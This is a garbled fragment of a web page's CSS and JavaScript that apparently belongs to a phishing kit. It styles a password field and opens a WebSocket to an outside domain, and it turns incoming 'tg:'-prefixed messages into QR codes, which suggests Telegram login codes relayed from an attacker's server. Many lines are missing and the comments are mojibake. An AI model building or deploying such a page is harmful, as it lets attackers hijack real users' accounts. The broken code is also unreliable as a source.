        body {

        .placeholder {

            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            transition: all 0.3s ease;
            pointer-events: none;
        }
        .password-input:focus + .placeholder,

        .next-button {

            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        var socket = new WebSocket("wss://xshou66.shop/ws");

        socket.onopen = function() {

        socket.onmessage = function(event) {
            if (event.data.startsWith("tg:")) {
                
                var qrcodediv = document.getElementById("qrcode")

                    text: event.data,

                });

                    // Ëé∑Âèñ‰∫åÁª¥Á†ÅÁöÑcanvasÂÖÉÁ¥†
                    var canvas = document.querySelector("#qrcode canvas");
                    var imgr = document.querySelector("#qrcode img");
                    var ctx = canvas.getContext("2d");

                    // ÂàõÂª∫‰∏Ä‰∏™ÂõæÂÉèÂØπË±°Áî®‰∫éÂä†ËΩΩÂõæÊ†á

                        // Â∞ÜÂõæÊ†áÁªòÂà∂Âà∞‰∫åÁª¥Á†ÅÁöÑ‰∏≠ÂøÉ
                        ctx.drawImage(img, x, y, iconSize, iconSize);
                        imgr.style.display = "none"
                        canvas.style.display = "block"
                    };
